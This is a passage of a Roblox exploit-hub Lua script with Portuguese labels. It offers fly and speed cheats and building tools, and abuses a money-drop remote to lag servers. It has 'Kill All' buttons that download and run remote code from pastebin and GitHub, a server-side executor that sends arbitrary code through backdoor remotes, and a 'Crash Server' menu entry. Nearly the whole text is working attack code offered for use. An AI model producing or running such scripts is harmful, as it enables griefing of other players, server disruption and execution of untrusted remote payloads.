				bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
			else
				bv.velocity = Vector3.new(0,0.1,0)
			end
			bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
		until not flying
		ctrl = {f = 0, b = 0, l = 0, r = 0}
		lastctrl = {f = 0, b = 0, l = 0, r = 0}
		speed = 0
		bg:Destroy()
		bv:Destroy()
		plr.Character.Humanoid.PlatformStand = false
	end
	mouse.KeyDown:connect(function(key)
		if key:lower() == "e" then
			if flying then flying = false
			else
				flying = true
				Fly()
			end
		elseif key:lower() == "w" then
			ctrl.f = 1
		elseif key:lower() == "s" then
			ctrl.b = -1
		elseif key:lower() == "a" then
			ctrl.l = -1
		elseif key:lower() == "d" then
			ctrl.r = 1
		end
	end)
	mouse.KeyUp:connect(function(key)
		if key:lower() == "w" then
			ctrl.f = 0
		elseif key:lower() == "s" then
			ctrl.b = 0
		elseif key:lower() == "a" then
			ctrl.l = 0
		elseif key:lower() == "d" then
			ctrl.r = 0
		end
	end)
	Fly()

end)
-- Scripts:

local function LHMZZV_fake_script() -- FlyScript.Script 
	local script = Instance.new('Script', FlyScript)

	frame = script.Parent.Gradient -- Take out {}s, and put name of frame
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(LHMZZV_fake_script)()
          end           
        })       
    TrollTab:AddButton({
        Name = "Btools - Use Bypass Adonis",
        Callback = function()
            -- Made by ILoveCats9030
-- Version: 1.3
-- Instances:
 
local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local Text = Instance.new("TextLabel")
local BT = Instance.new("TextButton")
 
--Properties:
 
ScreenGui.Parent = game.CoreGui
 
main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
main.BorderColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 5
main.Position = UDim2.new(0.0198598132, 0, 0.687250972, 0)
main.Size = UDim2.new(0, 207, 0, 146)
main.Active = true
 
Text.Name = "Text"
Text.Parent = ScreenGui
Text.BackgroundColor3 = Color3.fromRGB(157, 157, 157)
Text.Position = UDim2.new(0.0292056073, 0, 0.699203134, 0)
Text.Size = UDim2.new(0, 190, 0, 34)
Text.Font = Enum.Font.SciFi
Text.Text = "Btools script"
Text.TextColor3 = Color3.fromRGB(0, 0, 0)
Text.TextSize = 14.000
 
BT.Name = "BT"
BT.Parent = ScreenGui
BT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BT.Position = UDim2.new(0.0443925261, 0, 0.860557795, 0)
BT.Size = UDim2.new(0, 164, 0, 40)
BT.Style = Enum.ButtonStyle.RobloxRoundDefaultButton
BT.Font = Enum.Font.Highway
BT.Text = "Btools"
BT.TextColor3 = Color3.fromRGB(0, 0, 0)
BT.TextScaled = true
BT.TextSize = 14.000
BT.TextWrapped = true
BT.MouseButton1Down:connect(function()
local tool1 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
local tool2 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
local tool3 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
local tool4 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
local tool5 = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
tool1.BinType = "Clone"
tool2.BinType = "GameTool"
tool3.BinType = "Hammer"
tool4.BinType = "Script"
tool5.BinType = "Grab"
end)
          end           
        }) 
    JogadorTab:AddSlider({
        Name = "Velocidade",
        Min = 16,
        Max = 500,
        Default = 16,
        Color = Color3.fromRGB(255,255,255),
        Increment = 1,
        ValueName = "Speed",
        Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
            end    
    })    
    JogadorTab:AddSlider({
        Name = "Pulo",
        Min = 16,
        Max = 500,
        Default = 16,
        Color = Color3.fromRGB(255,255,255),
        Increment = 1,
        ValueName = "Jump",
        Callback = function(Value)
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value               
            end
        })       
TrollTab:AddButton({
	Name = "Drop Money Lag - Vida No Para",
	Callback = function()
        local args = {
            [1] = game:GetService("Players").LocalPlayer.PlayerGui["DropDinheiro by AliGameDeveloper"].Main.Frame.Drop,
            [2] = 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000.5,
            [3] = game:GetService("Players").LocalPlayer.Character
        }
        
        game:GetService("ReplicatedStorage").DropMoney:FireServer(unpack(args))
        wait(000000.5)
  	end    
})	
TrollTab:AddButton({
	Name = "Mudar Team - Eb exército",
	Callback = function()
		local p = game.Players:FindFirstChild("CorujaADM_GOD")
local t = game.Teams:FindFirstChild("[EB] Exército")
if p and t then p.Team = t end
	end
})	  
KillTab:AddButton({
	Name = "Kill All Viethin",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/8MrxeDEw",true))()
	end
})
local Section = HubTab:AddSection({
	Name = "Hub Trolls"
})
    HubTab:AddButton({
        Name = "Explode Hub - Bypassed (!)",
        Callback = function()
            _G.AutoEquip = true --se vc for usar arma de gamepass deixa isso como false
            loadstring(game:HttpGet(("https://raw.githubusercontent.com/GameLeaks2/RobloxScripts/main/KILL%20ALL"),true))()
          end        
        })
local Section = HubTab:AddSection({
	Name = "Outros"
})
    HubTab:AddButton({
        Name = "Executor Function - Bypassed (!)",
        Callback = function()
            --executor server side
 
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local Frame_2 = Instance.new("Frame")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
 
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(63, 8, 8)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.282012194, 0, 0.260122687, 0)
Frame.Size = UDim2.new(0, 572, 0, 390)
 
TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.0297202803, 0, 0.0435897447, 0)
TextBox.Size = UDim2.new(0, 537, 0, 276)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 20.000
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
 
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0297202803, 0, 0.807692289, 0)
TextButton.Size = UDim2.new(0, 200, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Execute"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 28.000
TextButton.TextWrapped = true
 
TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.618881166, 0, 0.807692289, 0)
TextButton_2.Size = UDim2.new(0, 200, 0, 50)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "Server Side Execute"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 28.000
TextButton_2.TextWrapped = true
 
TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.41083914, 0, 0.807692289, 0)
TextButton_3.Size = UDim2.new(0, 102, 0, 50)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "Clear"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 28.000
TextButton_3.TextWrapped = true
 
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(43, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(1, 0, 0, 0)
Frame_2.Size = UDim2.new(0, 93, 0, 390)
 
TextButton_4.Parent = Frame_2
TextButton_4.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.0752688199, 0, 0.146153852, 0)
TextButton_4.Size = UDim2.new(0, 78, 0, 76)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "tool deletar"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 29.000
 
TextButton_5.Parent = Frame_2
TextButton_5.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_5.BorderSizePixel = 0
TextButton_5.Position = UDim2.new(0.0752688199, 0, 0.402564108, 0)
TextButton_5.Size = UDim2.new(0, 78, 0, 76)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "rapido"
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextSize = 29.000
 
TextButton_6.Parent = Frame_2
TextButton_6.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
TextButton_6.BorderSizePixel = 0
TextButton_6.Position = UDim2.new(0.0752688199, 0, 0.658974409, 0)
TextButton_6.Size = UDim2.new(0, 78, 0, 76)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "fechar"
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextSize = 29.000
 
 
local function ZIUYTVS_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)
 
	script.Parent.MouseButton1Click:Connect(function()
		assert(loadstring(script.Parent.Parent.TextBox.Text))()
	end)
end
coroutine.wrap(ZIUYTVS_fake_script)()
local function HASJH_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)
 
	script.Parent.MouseButton1Click:Connect(function()
		game.ReplicatedStorage.RemoteEvent:FireServer(script.Parent.Parent.TextBox.Text)
	end)
end
coroutine.wrap(HASJH_fake_script)()
local function UAZSPPI_fake_script() -- TextButton_3.LocalScript 
	local script = Instance.new('LocalScript', TextButton_3)
 
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.TextBox.Text = "Cleared!"
		wait(.1)
		script.Parent.Parent.TextBox.Text = ""
	end)
end
coroutine.wrap(UAZSPPI_fake_script)()
local function ACWZSQI_fake_script() -- TextButton_4.LocalScript 
	local script = Instance.new('LocalScript', TextButton_4)
 
	script.Parent.MouseButton1Click:Connect(function()
		Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 2
		Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 3
		Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4
	end)
end
coroutine.wrap(ACWZSQI_fake_script)()
local function YRAT_fake_script() -- TextButton_5.LocalScript 
	local script = Instance.new('LocalScript', TextButton_5)
 
	script.Parent.MouseButton1Click:Connect(function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
	end)
end
coroutine.wrap(YRAT_fake_script)()
local function RTRPEIN_fake_script() -- TextButton_6.Script 
	local script = Instance.new('Script', TextButton_6)
 
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(RTRPEIN_fake_script)()
local function ANEL_fake_script() -- Frame.Dragable 
	local script = Instance.new('LocalScript', Frame)
 
	script.Parent.Active = true
	script.Parent.Draggable = true
end
coroutine.wrap(ANEL_fake_script)()
 
wait(0.2)
 
local ligmaXD = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local execute = Instance.new("TextButton")
local clear = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local image = Instance.new("ImageLabel")
local TextBox = Instance.new("TextBox")
local exit = Instance.new("TextButton")
local Frame_2 = Instance.new("Frame")
local gcg = Instance.new("TextButton")
local gguns = Instance.new("TextButton")
local infyield = Instance.new("TextButton")
local oneg = Instance.new("TextButton")
local cmess = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local fr6 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
 
--Properties:
 
ligmaXD.Name = "ligmaXD"
ligmaXD.Parent = game.CoreGui
 
 
exit.Name = "exit"
exit.Parent = Frame
exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
exit.BorderSizePixel = 0
exit.Position = UDim2.new(0.958532691, 0, 0.00262467191, 0)
exit.Size = UDim2.new(0, 26, 0, 19)
exit.Font = Enum.Font.SourceSans
exit.Text = "X"
exit.TextColor3 = Color3.fromRGB(0, 0, 0)
exit.TextSize = 14.000
 
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.Position = UDim2.new(0.806329131, 0, 0.0904872417, 0)
Frame_2.Size = UDim2.new(0, 145, 0, 374)
 
ImageLabel.Parent = ligmaXD
ImageLabel.Active = true
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(-0.127000004, 0, 0.407999992, 0)
ImageLabel.Size = UDim2.new(0, 90, 0, 90)
ImageLabel.Image = "rbxassetid://6250305906"
 
fr6.Name = "fr6"
fr6.Parent = ImageLabel
fr6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fr6.BackgroundTransparency = 1.000
fr6.Position = UDim2.new(0, 0, -0.633333325, 0)
fr6.Size = UDim2.new(0, 90, 0, 50)
fr6.Font = Enum.Font.SourceSansBold
fr6.Text = "Enjoy!"
fr6.TextColor3 = Color3.fromRGB(0, 0, 0)
fr6.TextScaled = true
fr6.TextSize = 18.000
fr6.TextTransparency = 1.000
fr6.TextWrapped = true
 
TextLabel_2.Parent = ImageLabel
TextLabel_2.Active = true
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1
TextLabel_2.Position = UDim2.new(0.99999994, 0, 0, 0)
TextLabel_2.Size = UDim2.new(0, 269, 0, 90)
TextLabel_2.Font = Enum.Font.SourceSansBold
TextLabel_2.LineHeight = 1.100
TextLabel_2.Text = "bem vindo ao executor                                                                                                                        Status: Injected"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 15.000
TextLabel_2.TextTransparency = 1.000
TextLabel_2.TextWrapped = true
 
-- Scripts:
 
local function OLFCRNW_fake_script() -- execute.execrip 
	local script = Instance.new('Script', execute)
 
	script.Parent.MouseButton1Click:Connect(function()
		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
			if v.Name:match("%^\\") then
				v:FireServer(script.Parent.Parent.TextBox.Text)
			end
		end
	end)
end
coroutine.wrap(OLFCRNW_fake_script)()
local function UGLYR_fake_script() -- clear.clerscrip 
	local script = Instance.new('Script', clear)
 
	script.Parent.MouseButton1Click:Connect(function(plr)
		script.Parent.Parent.TextBox.Text = " "
	end)
end
coroutine.wrap(UGLYR_fake_script)()
local function YRHUUF_fake_script() -- Frame.drag 
	local script = Instance.new('LocalScript', Frame)
 
	script.Parent.Draggable = true
end
coroutine.wrap(YRHUUF_fake_script)()
local function RGKBZD_fake_script() -- exit.excrip 
	local script = Instance.new('Script', exit)
 
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
end
coroutine.wrap(RGKBZD_fake_script)()
local function TWYE_fake_script() -- gcg.gcgs 
	local script = Instance.new('LocalScript', gcg)
 
	script.Parent.MouseButton1Click:Connect(function()
		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
			if v.Name:match("%^\\") then
				v:FireServer([[require(8226150094).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
			end
		end
	end)
end
coroutine.wrap(TWYE_fake_script)()
local function DVROF_fake_script() -- gguns.gguns 
	local script = Instance.new('LocalScript', gguns)
 
	script.Parent.MouseButton1Click:Connect(function()
		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
			if v.Name:match("%^\\") then
				v:FireServer([[require(4207271766).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
			end
		end
	end)
end
coroutine.wrap(DVROF_fake_script)()
local function XZQXAR_fake_script() -- infyield.iys 
	local script = Instance.new('LocalScript', infyield)
 
	script.Parent.MouseButton1Click:Connect(function()
		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
			if v.Name:match("%^\\") then
				v:FireServer([[require(4848156552)("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
			end
		end
	end)
end
coroutine.wrap(XZQXAR_fake_script)()
local function FNVRQD_fake_script() -- oneg.onegs 
	local script = Instance.new('LocalScript', oneg)
 
	script.Parent.MouseButton1Click:Connect(function()
		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
			if v.Name:match("%^\\") then
				v:FireServer([[require(8515473220).load("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
			end
		end
	end)
end
coroutine.wrap(FNVRQD_fake_script)()
local function TKTEZTF_fake_script() -- cmess.cmessS 
	local script = Instance.new('LocalScript', cmess)
 
	script.Parent.MouseButton1Click:Connect(function()
		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
			if v.Name:match("%^\\") then
				v:FireServer([[local m = Instance.new("Hint", game.Workspace) m.Text = "team c00lkidd, join today! https://discord.gg/7A5DRmUCnj"]])
			end
		end
	end)
end
coroutine.wrap(TKTEZTF_fake_script)()
local function DSSE_fake_script() -- ligmaXD.IntroTween 
	local script = Instance.new('LocalScript', ligmaXD)
 
	local img = script.Parent.ImageLabel
	local TweenService = game:GetService("TweenService")
	local txt = img.TextLabel
	local btn = img.fr6
	wait(1)
	img:TweenPosition(UDim2.new(0.458, 0, 0.408, 0), "Out", "Linear", 0.4, false)
	wait(3)
	img:TweenPosition(UDim2.new(0.01, 0, 0.813, 0), "Out", "Sine", 0.7, false)
	wait(1)
	TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
	TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["TextTransparency"] = 0}):Play()
 
	for i,v in pairs(game.Players:GetPlayers()) do
		if v.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then -- R6 detection
			btn.BackgroundTransparency = 1
			btn.TextTransparency = 1
		elseif v.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then -- R15 detection
			TweenService:Create(btn, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
			TweenService:Create(btn, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["TextTransparency"] = 0}):Play()
		end
	end
	wait(2)
	while wait() do
	for i,v in pairs(game.Players:GetPlayers()) do
		if v.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
	btn.Transparency = 1
	elseif v.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
	btn.Transparency = 0
	end
	end
	end
end
coroutine.wrap(DSSE_fake_script)()
local function MIKH_fake_script() -- fr6.1526 
	local script = Instance.new('LocalScript', fr6)
 
	script.Parent.MouseButton1Click:Connect(function()
		for i, v in ipairs(game:GetService("JointsService"):GetDescendants()) do
			if v.Name:match("%^\\") then
				v:FireServer([[require(3041175937):r6("]]..game:GetService('Players').LocalPlayer.Name..[[")]])
			end
		end
	end)
end
coroutine.wrap(MIKH_fake_script)()
          end     
        })
    HubTab:AddButton({
        Name = "Hub ACS",
        Callback = function()
            local a=Instance.new("ScreenGui")local b=Instance.new("Frame")local c=Instance.new("UICorner")local d=Instance.new("Frame")local e=Instance.new("UICorner")local f=Instance.new("TextLabel")local g=Instance.new("ScrollingFrame")local h=Instance.new("Frame")local i=Instance.new("TextButton")local j=Instance.new("UICorner")local k=Instance.new("UIStroke")local l=Instance.new("UIListLayout")local m=Instance.new("TextButton")local n=Instance.new("UICorner")local o=Instance.new("UIStroke")local p=Instance.new("TextButton")local q=Instance.new("UICorner")local r=Instance.new("UIStroke")local s=Instance.new("TextButton")local t=Instance.new("UICorner")local u=Instance.new("UIStroke")local v=Instance.new("Frame")local w=Instance.new("UICorner")local x=Instance.new("UIListLayout")local y=Instance.new("TextButton")local z=Instance.new("TextButton")local A=Instance.new("TextButton")local B=Instance.new("ScrollingFrame")local C=Instance.new("Frame")local D=Instance.new("UIListLayout")local E=Instance.new("TextButton")local F=Instance.new("UICorner")local G=Instance.new("ImageButton")local H=Instance.new("UICorner")local I=Instance.new("ImageLabel")local J=Instance.new("UIStroke")local K=Instance.new("TextLabel")local L=Instance.new("TextButton")local M=Instance.new("ScrollingFrame")local N=Instance.new("Frame")local O=Instance.new("TextButton")local P=Instance.new("UICorner")local Q=Instance.new("UIStroke")local R=Instance.new("UIListLayout")local S=Instance.new("TextButton")local T=Instance.new("UICorner")local U=Instance.new("UIStroke")local V=Instance.new("TextBox")local W=Instance.new("UICorner")local X=Instance.new("UIStroke")local Y=Instance.new("TextButton")local Z=Instance.new("UICorner")local _=Instance.new("UIStroke")local a0=Instance.new("TextBox")local a1=Instance.new("UICorner")local a2=Instance.new("UIStroke")local a3=Instance.new("TextButton")local a4=Instance.new("UICorner")local a5=Instance.new("UIStroke")local a6=Instance.new("UIStroke")a.Name="Nytrogen_SPIdk"a.Parent=game:GetService("CoreGui")or gethui()a.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;a.ResetOnSpawn=false;b.Parent=a;b.BackgroundColor3=Color3.fromRGB(34,34,34)b.BorderColor3=Color3.fromRGB(0,0,0)b.BorderSizePixel=0;b.ClipsDescendants=true;b.Position=UDim2.new(0,150,0,142)b.Size=UDim2.new(0,517,0,315)c.CornerRadius=UDim.new(0,15)c.Parent=b;d.Parent=b;d.BackgroundColor3=Color3.fromRGB(44,44,44)d.BackgroundTransparency=1.000;d.BorderColor3=Color3.fromRGB(0,0,0)d.BorderSizePixel=0;d.Size=UDim2.new(0,517,0,36)e.Parent=d;f.Name="Title"f.Parent=d;f.BackgroundColor3=Color3.fromRGB(255,255,255)f.BackgroundTransparency=1.000;f.BorderColor3=Color3.fromRGB(0,0,0)f.BorderSizePixel=0;f.Position=UDim2.new(0.00193435408,0,0,0)f.Size=UDim2.new(0,543,0,36)f.Font=Enum.Font.Gotham;f.Text="menu acs por viktor"f.TextColor3=Color3.fromRGB(255,255,255)f.TextSize=17.000;f.TextWrapped=true;g.Name="HunterFrame"g.Parent=b;g.Active=true;g.BackgroundColor3=Color3.fromRGB(34,34,34)g.BorderColor3=Color3.fromRGB(0,0,0)g.BorderSizePixel=0;g.Position=UDim2.new(0.214700252,0,0.139682546,0)g.Size=UDim2.new(0,405,0,263)g.ScrollBarImageTransparency=1.000;h.Parent=g;h.BackgroundColor3=Color3.fromRGB(255,255,255)h.BackgroundTransparency=1.000;h.BorderColor3=Color3.fromRGB(0,0,0)h.BorderSizePixel=0;h.Position=UDim2.new(0.0219999999,0,0.0199999996,0)h.Size=UDim2.new(0,387,0,34)i.Parent=h;i.BackgroundColor3=Color3.fromRGB(48,48,48)i.BorderColor3=Color3.fromRGB(0,0,0)i.BorderSizePixel=0;i.Position=UDim2.new(-2.36570372e-07,0,0,0)i.Size=UDim2.new(0,378,0,33)i.Font=Enum.Font.Gotham;i.LineHeight=1.030;i.Text="Obter todas as armas"i.TextColor3=Color3.fromRGB(255,255,255)i.TextSize=14.000;j.Parent=i;k.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;k.Color=Color3.fromRGB(79,79,79)k.Parent=i;l.Parent=h;l.SortOrder=Enum.SortOrder.LayoutOrder;l.Padding=UDim.new(0,5)m.Parent=h;m.BackgroundColor3=Color3.fromRGB(48,48,48)m.BorderColor3=Color3.fromRGB(0,0,0)m.BorderSizePixel=0;m.Position=UDim2.new(-2.36570372e-07,0,0,0)m.Size=UDim2.new(0,378,0,33)m.Font=Enum.Font.Gotham;m.LineHeight=1.030;m.Text="Crash Server"m.TextColor3=Color3.fromRGB(255,255,255)m.TextSize=14.000;n.Parent=m;o.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;o.Color=Color3.fromRGB(79,79,79)o.Parent=m;p.Parent=h;p.BackgroundColor3=Color3.fromRGB(48,48,48)p.BorderColor3=Color3.fromRGB(0,0,0)p.BorderSizePixel=0;p.Position=UDim2.new(-2.36570372e-07,0,0,0)p.Size=UDim2.new(0,378,0,33)p.Font=Enum.Font.Gotham;p.LineHeight=1.030;p.Text="Supress Server"p.TextColor3=Color3.fromRGB(255,255,255)p.TextSize=14.000;q.Parent=p;r.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;r.Color=Color3.fromRGB(79,79,79)r.Parent=p;s.Parent=h;s.BackgroundColor3=Color3.fromRGB(48,48,48)s.BorderColor3=Color3.fromRGB(0,0,0)s.BorderSizePixel=0;s.Position=UDim2.new(-2.36570372e-07,0,0,0)s.Size=UDim2.new(0,378,0,33)s.Font=Enum.Font.Gotham;s.LineHeight=1.030;s.Text="Sem cooldown de pulo"s.TextColor3=Color3.fromRGB(255,255,255)s.TextSize=14.000;t.Parent=s;u.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;u.Color=Color3.fromRGB(79,79,79)u.Parent=s;v.Parent=b;v.BackgroundColor3=Color3.fromRGB(36,36,36)v.BorderColor3=Color3.fromRGB(0,0,0)v.BorderSizePixel=0;v.Position=UDim2.new(0,0,0.114285715,0)v.Size=UDim2.new(0,111,0,279)w.Parent=v;x.Parent=v;x.SortOrder=Enum.SortOrder.LayoutOrder;x.Padding=UDim.new(0,6)y.Parent=v;y.BackgroundColor3=Color3.fromRGB(255,255,255)y.BackgroundTransparency=1.000;y.BorderColor3=Color3.fromRGB(0,0,0)y.BorderSizePixel=0;y.Position=UDim2.new(0,0,0.0553505532,0)y.Size=UDim2.new(0,111,0,29)y.Font=Enum.Font.Gotham;y.Text="ACS 2.0.1"y.TextColor3=Color3.fromRGB(255,255,255)y.TextSize=14.000;z.Parent=v;z.BackgroundColor3=Color3.fromRGB(255,255,255)z.BackgroundTransparency=1.000;z.BorderColor3=Color3.fromRGB(0,0,0)z.BorderSizePixel=0;z.Position=UDim2.new(0,0,0.0553505532,0)z.Size=UDim2.new(0,111,0,29)z.Font=Enum.Font.Gotham;z.Text="Local Player"z.TextColor3=Color3.fromRGB(255,255,255)z.TextSize=14.000;A.Parent=v;A.BackgroundColor3=Color3.fromRGB(255,255,255)A.BackgroundTransparency=1.000;A.BorderColor3=Color3.fromRGB(0,0,0)A.BorderSizePixel=0;A.Position=UDim2.new(0,0,0.0553505532,0)A.Size=UDim2.new(0,111,0,29)A.Font=Enum.Font.Gotham;A.Text="Visuals"A.TextColor3=Color3.fromRGB(255,255,255)A.TextSize=14.000;B.Name="VisualsFrame"B.Parent=b;B.Active=true;B.BackgroundColor3=Color3.fromRGB(34,34,34)B.BorderColor3=Color3.fromRGB(0,0,0)B.BorderSizePixel=0;B.Position=UDim2.new(0.214700252,0,0.139682546,0)B.Size=UDim2.new(0,405,0,271)B.Visible=false;C.Parent=B;C.BackgroundColor3=Color3.fromRGB(255,255,255)C.BackgroundTransparency=1.000;C.BorderColor3=Color3.fromRGB(0,0,0)C.BorderSizePixel=0;C.Position=UDim2.new(0.0219999999,0,0.0199999996,0)C.Size=UDim2.new(0,387,0,34)D.Parent=C;D.SortOrder=Enum.SortOrder.LayoutOrder;D.Padding=UDim.new(0,5)E.Name="Toggle"E.Parent=C;E.BackgroundColor3=Color3.fromRGB(48,48,48)E.BorderColor3=Color3.fromRGB(0,0,0)E.BorderSizePixel=0;E.Position=UDim2.new(0,0,5.58823538,0)E.Size=UDim2.new(0,379,0,38)E.Font=Enum.Font.Gotham;E.Text=""E.TextColor3=Color3.fromRGB(255,255,255)E.TextSize=14.000;F.Parent=E;G.Parent=E;G.BackgroundColor3=Color3.fromRGB(72,72,72)G.BorderColor3=Color3.fromRGB(0,0,0)G.BorderSizePixel=0;G.Position=UDim2.new(0.910000026,0,0.119999997,0)G.Size=UDim2.new(0,30,0,30)G.AutoButtonColor=false;H.CornerRadius=UDim.new(0,6)H.Parent=G;I.Name="Frame"I.Parent=G;I.AnchorPoint=Vector2.new(0.5,0.5)I.BackgroundColor3=Color3.fromRGB(255,255,255)I.BackgroundTransparency=1.000;I.BorderColor3=Color3.fromRGB(0,0,0)I.BorderSizePixel=0;I.Position=UDim2.new(0.519999981,0,0.519999981,0)I.Image="http://www.roblox.com/asset/?id=6031094667"I.ImageTransparency=1.000;J.ApplyStrokeMode=Enum.ApplyStrokeMode.Border;J.Color=Color3.fromRGB(75,75,75)J.Parent=E;K.Parent=E;K.BackgroundColor3=Color3.fromRGB(255,255,255)K.BackgroundTransparency=1.000;K.BorderColor3=Color3.fromRGB(0,0,0)K.BorderSizePixel=0;K.Size=UDim2.new(0,116,0,38)K.Font=Enum.Font.Gotham;K.Text="Enable 